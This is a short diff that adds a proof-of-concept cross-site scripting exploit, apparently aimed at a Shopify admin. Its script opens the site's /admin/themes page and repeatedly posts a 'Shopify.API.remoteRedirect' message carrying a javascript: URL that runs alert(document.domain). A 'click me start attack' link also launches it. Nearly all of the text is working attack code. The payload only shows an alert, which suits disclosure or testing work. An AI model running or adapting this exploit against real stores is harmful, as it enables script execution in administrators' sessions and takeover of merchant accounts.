@@ -36,3 +36,21 @@ function xss() {
     }, 500);
 }
     </script>
+###########################################
+<script>
+  function attack(){
+    var ctx=window.open(location.origin+'/admin/themes','_blank');
+    var interval;
+    interval=setInterval(function(){
+      if(window.attackSuccess){
+        clearInterval(interval);
+      }else{
+        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
+      }
+    },500);;
+  }
+  attack();
+</script>
+<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
+
+
